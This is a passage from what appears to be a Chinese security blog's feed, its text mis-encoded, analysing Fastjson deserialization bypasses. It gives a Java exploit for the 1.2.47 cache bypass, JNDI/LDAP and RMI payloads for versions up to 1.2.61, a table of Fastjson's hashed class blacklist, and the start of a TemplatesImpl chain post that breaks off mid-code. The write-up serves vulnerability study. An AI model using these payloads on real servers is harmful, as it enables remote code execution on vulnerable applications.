src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280010162.png" alt="image-20230828001032000"><br>æœ€ç»ˆçš„expï¼Œè¿™ä¸ªçš„payloadä¸¤æ¬¡æµç¨‹å¾—å†™åœ¨ä¸€èµ·ä¸€æ¬¡æ€§å®Œæˆä¸ç„¶å°±è¯»å–ä¸åˆ°ç¼“å­˜äº†ï¼Œå†™æ³•å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.MiscCodec;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass47</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/remoteObj\&quot;,\&quot;AutoCommit\&quot;:\&quot;false\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(s);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280011388.png" alt="image-20230828001101946"><br>è€Œåœ¨1.2.48ç‰ˆæœ¬ä¸­ç¼“å­˜å¼€å…³cacheé»˜è®¤è®¾ç½®ä¸ºäº†Falseï¼Œè¿™ä¸ªå°±ä¸è¡Œäº†ï¼ŒåŒæ—¶è¿™ä¸ªæ–¹æ³•åœ¨47åŠå‰é¢çš„ç‰ˆæœ¬åˆ©ç”¨ä¹Ÿåˆ†ä¸ºäº†ä¸¤æ®µ</p></li><li><p>1.2.25-1.2.32ç‰ˆæœ¬ï¼šæœªå¼€å¯AutoTypeSupportæ—¶èƒ½æˆåŠŸåˆ©ç”¨ï¼Œå¼€å¯AutoTypeSupportåè€Œä¸èƒ½æˆåŠŸè§¦å‘ï¼›</p></li><li><p>1.2.33-1.2.47ç‰ˆæœ¬ï¼šæ— è®ºæ˜¯å¦å¼€å¯AutoTypeSupportï¼Œéƒ½èƒ½æˆåŠŸåˆ©ç”¨ï¼›</p></li></ul><h2 id="Fastjson-lt-x3D-1-2-61-é€šæ€"><a href="#Fastjson-lt-x3D-1-2-61-é€šæ€" class="headerlink" title="Fastjson &lt;&#x3D; 1.2.61 é€šæ€"></a>Fastjson &lt;&#x3D; 1.2.61 é€šæ€</h2><p>è¿™ä¸ªå°±è®°å½•ä¸€ä¸‹payloadå§ï¼Œæ‡’å¾—è·Ÿäº†ï¼Œçœ‹èµ·æ¥åƒæ˜¯é»‘åå•çš„ç»•è¿‡</p><h3 id="Fastjson1-2-5-lt-x3D-1-2-59"><a href="#Fastjson1-2-5-lt-x3D-1-2-59" class="headerlink" title="Fastjson1.2.5 &lt;&#x3D; 1.2.59"></a>Fastjson1.2.5 &lt;&#x3D; 1.2.59</h3><p><strong>éœ€è¦å¼€å¯AutoType</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson1-2-5-lt-x3D-1-2-60"><a href="#Fastjson1-2-5-lt-x3D-1-2-60" class="headerlink" title="Fastjson1.2.5 &lt;&#x3D; 1.2.60"></a>Fastjson1.2.5 &lt;&#x3D; 1.2.60</h3><p><strong>æ— éœ€å¼€å¯ autoTypeï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span>,<span class="string">&quot;xaDataSourceName&quot;</span>:<span class="string">&quot;rmi://10.10.20.166:1099/ExportObject&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span>,<span class="string">&quot;prefix&quot;</span>:<span class="string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson1-2-5-lt-x3D-1-2-61"><a href="#Fastjson1-2-5-lt-x3D-1-2-61" class="headerlink" title="Fastjson1.2.5 &lt;&#x3D; 1.2.61"></a>Fastjson1.2.5 &lt;&#x3D; 1.2.61</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<span class="string">&quot;jndiName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploi</span></span><br></pre></td></tr></table></figure><h2 id="å·²çŸ¥å“ˆå¸Œé»‘åå•"><a href="#å·²çŸ¥å“ˆå¸Œé»‘åå•" class="headerlink" title="å·²çŸ¥å“ˆå¸Œé»‘åå•"></a>å·²çŸ¥å“ˆå¸Œé»‘åå•</h2><p>ç›®å‰å·²çŸ¥çš„å“ˆå¸Œé»‘åå•çš„å¯¹åº”è¡¨å¦‚ä¸‹ï¼š</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>-8720046426850100497</td><td>0x86fc2bf9beaf7aefL</td><td>org.apache.commons.collections4.comparators</td></tr><tr><td>1.2.42</td><td>-8109300701639721088</td><td>0x8f75f9fa0df03f80L</td><td>org.python.core</td></tr><tr><td>1.2.42</td><td>-7966123100503199569</td><td>0x9172a53f157930afL</td><td>org.apache.tomcat</td></tr><tr><td>1.2.42</td><td>-7766605818834748097</td><td>0x9437792831df7d3fL</td><td>org.apache.xalan</td></tr><tr><td>1.2.42</td><td>-6835437086156813536</td><td>0xa123a62f93178b20L</td><td>javax.xml</td></tr><tr><td>1.2.42</td><td>-4837536971810737970</td><td>0xbcdd9dc12766f0ceL</td><td>org.springframework.</td></tr><tr><td>1.2.42</td><td>-4082057040235125754</td><td>0xc7599ebfe3e72406L</td><td>org.apache.commons.beanutils</td></tr><tr><td>1.2.42</td><td>-2364987994247679115</td><td>0xdf2ddff310cdb375L</td><td>org.apache.commons.collections.Transformer</td></tr><tr><td>1.2.42</td><td>-1872417015366588117</td><td>0xe603d6a51fad692bL</td><td>org.codehaus.groovy.runtime</td></tr><tr><td>1.2.42</td><td>-254670111376247151</td><td>0xfc773ae20c827691L</td><td>java.lang.Thread</td></tr><tr><td>1.2.42</td><td>-190281065685395680</td><td>0xfd5bfc610056d720L</td><td>javax.net.</td></tr><tr><td>1.2.42</td><td>313864100207897507</td><td>0x45b11bc78a3aba3L</td><td>com.mchange</td></tr><tr><td>1.2.42</td><td>1203232727967308606</td><td>0x10b2bdca849d9b3eL</td><td>org.apache.wicket.util</td></tr><tr><td>1.2.42</td><td>1502845958873959152</td><td>0x14db2e6fead04af0L</td><td>java.util.jar.</td></tr><tr><td>1.2.42</td><td>3547627781654598988</td><td>0x313bb4abd8d4554cL</td><td>org.mozilla.javascript</td></tr><tr><td>1.2.42</td><td>3730752432285826863</td><td>0x33c64b921f523f2fL</td><td>java.rmi</td></tr><tr><td>1.2.42</td><td>3794316665763266033</td><td>0x34a81ee78429fdf1L</td><td>java.util.prefs.</td></tr><tr><td>1.2.42</td><td>4147696707147271408</td><td>0x398f942e01920cf0L</td><td>com.sun.</td></tr><tr><td>1.2.42</td><td>5347909877633654828</td><td>0x4a3797b30328202cL</td><td>java.util.logging.</td></tr><tr><td>1.2.42</td><td>5450448828334921485</td><td>0x4ba3e254e758d70dL</td><td>org.apache.bcel</td></tr><tr><td>1.2.42</td><td>5751393439502795295</td><td>0x4fd10ddc6d13821fL</td><td>java.net.Socket</td></tr><tr><td>1.2.42</td><td>5944107969236155580</td><td>0x527db6b46ce3bcbcL</td><td>org.apache.commons.fileupload</td></tr><tr><td>1.2.42</td><td>6742705432718011780</td><td>0x5d92e6ddde40ed84L</td><td>org.jboss</td></tr><tr><td>1.2.42</td><td>7179336928365889465</td><td>0x63a220e60a17c7b9L</td><td>org.hibernate</td></tr><tr><td>1.2.42</td><td>7442624256860549330</td><td>0x6749835432e0f0d2L</td><td>org.apache.commons.collections.functors</td></tr><tr><td>1.2.42</td><td>8838294710098435315</td><td>0x7aa7ee3627a19cf3L</td><td>org.apache.myfaces.context.servlet</td></tr><tr><td>1.2.43</td><td>-2262244760619952081</td><td>0xe09ae4604842582fL</td><td>java.net.URL</td></tr><tr><td>1.2.46</td><td>-8165637398350707645</td><td>0x8eadd40cb2a94443L</td><td>junit.</td></tr><tr><td>1.2.46</td><td>-8083514888460375884</td><td>0x8fd1960988bce8b4L</td><td>org.apache.ibatis.datasource</td></tr><tr><td>1.2.46</td><td>-7921218830998286408</td><td>0x92122d710e364fb8L</td><td>org.osjava.sj.</td></tr><tr><td>1.2.46</td><td>-7768608037458185275</td><td>0x94305c26580f73c5L</td><td>org.apache.log4j.</td></tr><tr><td>1.2.46</td><td>-6179589609550493385</td><td>0xaa3daffdb10c4937L</td><td>org.logicalcobwebs.</td></tr><tr><td>1.2.46</td><td>-5194641081268104286</td><td>0xb7e8ed757f5d13a2L</td><td>org.apache.logging.</td></tr><tr><td>1.2.46</td><td>-3935185854875733362</td><td>0xc963695082fd728eL</td><td>org.apache.commons.dbcp</td></tr><tr><td>1.2.46</td><td>-2753427844400776271</td><td>0xd9c9dbf6bbd27bb1L</td><td>com.ibatis.sqlmap.engine.datasource</td></tr><tr><td>1.2.46</td><td>-1589194880214235129</td><td>0xe9f20bad25f60807L</td><td>org.jdom.</td></tr><tr><td>1.2.46</td><td>1073634739308289776</td><td>0xee6511b66fd5ef0L</td><td>org.slf4j.</td></tr><tr><td>1.2.46</td><td>5688200883751798389</td><td>0x4ef08c90ff16c675L</td><td>javassist.</td></tr><tr><td>1.2.46</td><td>7017492163108594270</td><td>0x616323f12c2ce25eL</td><td>oracle.net</td></tr><tr><td>1.2.46</td><td>8389032537095247355</td><td>0x746bd4a53ec195fbL</td><td>org.jaxen.</td></tr><tr><td>1.2.48</td><td>1459860845934817624</td><td>0x144277b467723158L</td><td>java.net.InetAddress</td></tr><tr><td>1.2.48</td><td>8409640769019589119</td><td>0x74b50bb9260e31ffL</td><td>java.lang.Class</td></tr><tr><td>1.2.49</td><td>4904007817188630457</td><td>0x440e89208f445fb9L</td><td>com.alibaba.fastjson.annotation</td></tr><tr><td>1.2.59</td><td>5100336081510080343</td><td>0x46c808a4b5841f57L</td><td>org.apache.cxf.jaxrs.provider.</td></tr><tr><td>1.2.59</td><td>6456855723474196908</td><td>0x599b5c1213a099acL</td><td>ch.qos.logback.</td></tr><tr><td>1.2.59</td><td>8537233257283452655</td><td>0x767a586a5107feefL</td><td>net.sf.ehcache.transaction.manager.</td></tr><tr><td>1.2.60</td><td>3688179072722109200</td><td>0x332f0b5369a18310L</td><td>com.zaxxer.hikari.</td></tr><tr><td>1.2.61</td><td>-4401390804044377335</td><td>0xc2eb1e621f439309L</td><td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td></tr><tr><td>1.2.61</td><td>-1650485814983027158</td><td>0xe9184be55b1d962aL</td><td>org.apache.openjpa.ee.</td></tr><tr><td>1.2.61</td><td>-1251419154176620831</td><td>0xeea210e8da2ec6e1L</td><td>oracle.jdbc.rowset.OracleJDBCRowSet</td></tr><tr><td>1.2.61</td><td>-9822483067882491</td><td>0xffdd1a80f1ed3405L</td><td>com.mysql.cj.jdbc.admin.</td></tr><tr><td>1.2.61</td><td>99147092142056280</td><td>0x1603dc147a3e358L</td><td>oracle.jdbc.connector.OracleManagedConnectionFactory</td></tr><tr><td>1.2.61</td><td>3114862868117605599</td><td>0x2b3a37467a344cdfL</td><td>org.apache.ibatis.parsing.</td></tr><tr><td>1.2.61</td><td>4814658433570175913</td><td>0x42d11a560fc9fba9L</td><td>org.apache.axis2.jaxws.spi.handler.</td></tr><tr><td>1.2.61</td><td>6511035576063254270</td><td>0x5a5bd85c072e5efeL</td><td>jodd.db.connection.</td></tr><tr><td>1.2.61</td><td>8925522461579647174</td><td>0x7bddd363ad3998c6L</td><td>org.apache.commons.configuration.JNDIConfiguration</td></tr><tr><td>1.2.62</td><td>-9164606388214699518</td><td>0x80d0c70bcc2fea02L</td><td>org.apache.ibatis.executor.</td></tr><tr><td>1.2.62</td><td>-8649961213709896794</td><td>0x87f52a1b07ea33a6L</td><td>net.sf.cglib.</td></tr><tr><td>1.2.62</td><td>-5764804792063216819</td><td>0xafff4c95b99a334dL</td><td>com.mysql.cj.jdbc.MysqlDataSource</td></tr><tr><td>1.2.62</td><td>-4438775680185074100</td><td>0xc2664d0958ecfe4cL</td><td>aj.org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>-3319207949486691020</td><td>0xd1efcdf4b3316d34L</td><td>oracle.jdbc.</td></tr><tr><td>1.2.62</td><td>-2192804397019347313</td><td>0xe1919804d5bf468fL</td><td>org.apache.commons.collections.comparators.</td></tr><tr><td>1.2.62</td><td>-2095516571388852610</td><td>0xe2eb3ac7e56c467eL</td><td>net.sf.ehcache.hibernate.</td></tr><tr><td>1.2.62</td><td>4750336058574309</td><td>0x10e067cd55c5e5L</td><td>com.mysql.cj.log.</td></tr><tr><td>1.2.62</td><td>218512992947536312</td><td>0x3085068cb7201b8L</td><td>org.h2.jdbcx.</td></tr><tr><td>1.2.62</td><td>823641066473609950</td><td>0xb6e292fa5955adeL</td><td>org.apache.commons.logging.</td></tr><tr><td>1.2.62</td><td>1534439610567445754</td><td>0x154b6cb22d294cfaL</td><td>org.apache.ibatis.reflection.</td></tr><tr><td>1.2.62</td><td>1818089308493370394</td><td>0x193b2697eaaed41aL</td><td>org.h2.server.</td></tr><tr><td>1.2.62</td><td>2164696723069287854</td><td>0x1e0a8c3358ff3daeL</td><td>org.apache.ibatis.datasource.</td></tr><tr><td>1.2.62</td><td>2653453629929770569</td><td>0x24d2f6048fef4e49L</td><td>org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>2836431254737891113</td><td>0x275d0732b877af29L</td><td>flex.messaging.util.concurrent.</td></tr><tr><td>1.2.62</td><td>3089451460101527857</td><td>0x2adfefbbfe29d931L</td><td>org.apache.ibatis.javassist.</td></tr><tr><td>1.2.62</td><td>3718352661124136681</td><td>0x339a3e0b6beebee9L</td><td>org.apache.ibatis.ognl.</td></tr><tr><td>1.2.62</td><td>4046190361520671643</td><td>0x3826f4b2380c8b9bL</td><td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td></tr><tr><td>1.2.62</td><td>6280357960959217660</td><td>0x5728504a6d454ffcL</td><td>org.apache.ibatis.scripting.</td></tr><tr><td>1.2.62</td><td>6734240326434096246</td><td>0x5d74d3e5b9370476L</td><td>com.mysql.cj.jdbc.MysqlXADataSource</td></tr><tr><td>1.2.62</td><td>7123326897294507060</td><td>0x62db241274397c34L</td><td>org.apache.commons.collections.functors.</td></tr><tr><td>1.2.62</td><td>8488266005336625107</td><td>0x75cc60f5871d0fd3L</td><td>org.apache.commons.configuration</td></tr></tbody></table><p>ç›®å‰æœªçŸ¥çš„å“ˆå¸Œé»‘åå•ï¼š</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>33238344207745342</td><td>0x761619136cc13eL</td><td></td></tr><tr><td>1.2.62</td><td>-6316154655839304624</td><td>0xa85882ce1044c450L</td><td></td></tr><tr><td>1.2.62</td><td>-5472097725414717105</td><td>0xb40f341c746ec94fL</td><td></td></tr><tr><td>1.2.62</td><td>-4608341446948126581</td><td>0xc00be1debaf2808bL</td><td></td></tr><tr><td>1.2.62</td><td>3256258368248066264</td><td>0x2d308dbbc851b0d8L</td><td></td></tr><tr><td>1.2.62</td><td>4841947709850912914</td><td>0x43320dc9d2ae0892L</td><td></td></tr><tr><td>1.2.62</td><td>6534946468240507089</td><td>0x5ab0cb3071ab40d1L</td><td></td></tr></tbody></table><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#0x08-1-2-25-1-2-47%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87">Javaååºåˆ—åŒ–Fastjsonç¯‡03-Fastjsonå„ç‰ˆæœ¬ç»•è¿‡åˆ†æ | Drunkbabyâ€™s Blog (drun1baby.top)</a><br><a href="http://blog.topsec.com.cn/fastjson%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%EF%BC%88%E4%B8%80%EF%BC%89/">Fastjsonå†å²æ¼æ´ç ”ç©¶ï¼ˆä¸€ï¼‰ | å¤©èä¿¡é˜¿å°”æ³•å®éªŒå®¤ (topsec.com.cn)</a><br><a href="https://xz.aliyun.com/t/12728#toc-9">Javaååºåˆ—åŒ–ä¹‹FastJsonååºåˆ—åŒ–åŠç»•è¿‡ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a><br><a href="https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.999.0.0&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson1.2.24åˆ©ç”¨é“¾åˆ†æ</title>
      <link href="/2023/08/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BFastjson1-2-24%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2023/08/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BFastjson1-2-24%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>pom.xmlä¾èµ–å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.5</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.12</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>å…¶å®ƒçš„å’Œä¹‹å‰æ²¡å•¥å·®åˆ«ï¼Œjdkç”¨8u65å°±è¡Œï¼Œå› ä¸ºä¼šæœ‰jndiç›¸å…³çš„ä¸€äº›ä¸œè¥¿</p><h2 id="åŸºäº-TemplatesImpl-çš„åˆ©ç”¨é“¾"><a href="#åŸºäº-TemplatesImpl-çš„åˆ©ç”¨é“¾" class="headerlink" title="åŸºäº TemplatesImpl çš„åˆ©ç”¨é“¾"></a>åŸºäº TemplatesImpl çš„åˆ©ç”¨é“¾</h2><p>è¿™æ¡é“¾å­ç½‘ä¸Šçš„æ–‡ç« åˆ†æçš„å¾ˆå¤šï¼Œä½†æ˜¯ç”¨çš„å´æ˜¯æœ€å°‘çš„ï¼Œfastjsonä¸­å°±æ˜¯æ‰¾å“ªä¸ªç±»ä¸‹çš„getterå’Œsetteræœ‰é—®é¢˜ï¼Œè€Œè¿™æ¡é“¾ä¼ å…¥äº†ä¸€å †æ ¹æœ¬æ²¡æœ‰getterå’Œsetterçš„å˜é‡ï¼Œæ‰€ä»¥å°±å¾—å¼€å¯<code>Feature.SupportNonPublicField</code>è¿™ä¸ªå±æ€§ååºåˆ—åŒ–çš„æ—¶å€™æ‰èƒ½è§£æé‚£äº›æ²¡æœ‰getterå’Œsetteræ–¹æ³•çš„å±æ€§ï¼Œè¿™æ ·å°±å¯¼è‡´äº†è¿™æ¡é“¾å®ç”¨ä»·å€¼å¹¶ä¸é«˜</p><h3 id="1-é“¾å­åˆ†æ"><a href="#1-é“¾å­åˆ†æ" class="headerlink" title="1.é“¾å­åˆ†æ"></a>1.é“¾å­åˆ†æ</h3><h4 id="é€‰å–èƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œçš„ç±»"><a href="#é€‰å–èƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œçš„ç±»" class="headerlink" title="é€‰å–èƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œçš„ç±»"></a>é€‰å–èƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œçš„ç±»</h4><p>è¿™é‡Œç›´æ¥å»åˆ°å‘ç°æ¼æ´çš„ç±»ï¼Œåœ¨TemplatesImplç±»ï¼Œè¿™ä¸ªç±»ä¹Ÿæ˜¯CC3ä¸­åˆ©ç”¨çš„åŠ è½½å­—èŠ‚ç çš„ç±»å³è°ƒç”¨<code>newInstance()</code> æ–¹æ³•è§¦å‘æ¼æ´ï¼Œåœ¨fastjsonä¸­å®ƒçš„ä¸€ä¸ªgetteræ–¹æ³•é‡Œé¢ä¹Ÿè°ƒç”¨äº†å³<code>getTransletInstance()</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212125997.png" alt="image-20230821212512323"><br>é‚£è¿™é‡Œå¯èƒ½å°±ä¼šå‡ºé—®é¢˜ï¼Œå®é™…ä¸Šä¹Ÿç¡®å®æœ‰é—®é¢˜</p><h4 id="TemplatesImplè°ƒç”¨æ¡ä»¶åˆ†æ"><a href="#TemplatesImplè°ƒç”¨æ¡ä»¶åˆ†æ" class="headerlink" title="TemplatesImplè°ƒç”¨æ¡ä»¶åˆ†æ"></a>TemplatesImplè°ƒç”¨æ¡ä»¶åˆ†æ</h4><p>æœ¬æ¥æƒ³å…ˆè°ƒè¯•ä¸€ä¸‹å†æ¥çœ‹çš„ï¼Œå¥ˆä½•æŠ€æœ¯å¤ªå·®ä¸ä¼šè°ƒï¼Œå°±è·Ÿç€Drunkbabyä½¬å…ˆçœ‹ä¸€ä¸‹ <code>getTransletInstance()</code> æ–¹æ³•ï¼Œè¿™é‡Œå…¶å®å°±å’ŒCC3å·®ä¸å¤šçš„äº†ï¼Œæˆ‘ä»¬éœ€è¦è¿›å…¥<code>defineTransletClasses()</code>æ–¹æ³•é‡Œé¢ï¼Œé‚£ä¹ˆè¿™é‡Œè¦æ»¡è¶³çš„æ¡ä»¶å°±å’ŒCC3ä¸€æ ·çš„äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212125759.png" alt="image-20230821212545549"><br><code>_name</code>ä¸èƒ½ä¸ºç©ºï¼Œ<code>_class</code>è¦ä¸ºç©ºæ‰èƒ½è¿›å…¥åˆ°<code>defineTransletClasses()</code>æ–¹æ³•æ‰€ä»¥ä¸èµ‹å€¼æˆ–è€…èµ‹å€¼ä¸ºnulléƒ½è¡Œï¼Œæ¥ç€æ¥åˆ°<code>defineTransletClasses()</code>æ–¹æ³•ï¼Œ<code>_bytecodes</code>ä¸èƒ½ä¸ºç©ºå¦åˆ™æŠ›å¼‚å¸¸ï¼Œæ¥ç€å°±æ˜¯<code>_tfactory</code>ä¸èƒ½ä¸ºç©ºï¼Œå› ä¸ºè¿™é‡Œä¼šè°ƒç”¨åˆ°<code>getExternalExtensionsMap()</code>æ–¹æ³•ä¸ºç©ºçš„è¯ä½ æ— æ³•è°ƒç”¨å¹¶ä¸”ä¼šæŠ¥é”™ï¼Œè¿™é‡Œçœ‹ä¸€ä¸‹è¿™ä¸ªå˜é‡å‘ç°æ˜¯<code>transient</code>æ¥ä¿®é¥°çš„ï¼Œæ„å‘³ç€ååºåˆ—åŒ–æ— æ³•å–åˆ°å®ƒçš„å€¼<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212126940.png" alt="image-20230821212603849"><br>ä¸è¿‡å®ƒä¸€å¼€å§‹å°±è¿›è¡Œäº†å®ä¾‹åŒ–æ­£å¥½ä¸º<code>TransformerFactoryImpl</code>ç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å°±ä¸éœ€è¦å¤„ç†ï¼Œä½†æ˜¯åœ¨è¿™é‡Œå°±æœ‰ä¸ªç–‘é—®äº†ï¼Œè¿™ä¹Ÿæ˜¯å‰å‡ å¤©Jasperå¸ˆå‚…é—®æˆ‘çš„ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘åœ¨åˆ†æCC3çš„æ—¶å€™éƒ½æ²¡æ³¨æ„åˆ°è¿™ä¸ªé—®é¢˜ï¼Œæ—¢ç„¶å®ƒæ˜¯ç”±<code>transient</code>æ¥ä¿®é¥°ååºåˆ—åŒ–æ— æ³•è·å–åˆ°å®ƒçš„å€¼ï¼Œå…¨é å®ƒè‡ªå·±çš„åˆå§‹åŒ–ï¼Œé‚£ä¹ˆexpä¸­ä¸ºä»€ä¹ˆåˆè¦ç»™å®ƒå¤„ç†ä¸€ä¸‹å‘¢ï¼Ÿæˆ‘è®°å¾—åœ¨CC3ä¸­æ˜¯é€šè¿‡åå°„ç»™å®ƒå®ä¾‹åŒ–äº†ä¸€ä¸‹ï¼Œå¸¦ç€è¿™ä¸ªé—®é¢˜ç»§ç»­å¾€ä¸‹ï¼Œçœ‹çœ‹å¾…ä¼šèƒ½ä¸èƒ½ææ‡‚ï¼Œç›®å‰å¤§æ¦‚çš„payloadå°±å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> <span class="string">&quot;E:\\Javaååºåˆ—åŒ–\\test.class&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilClassPath);</span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 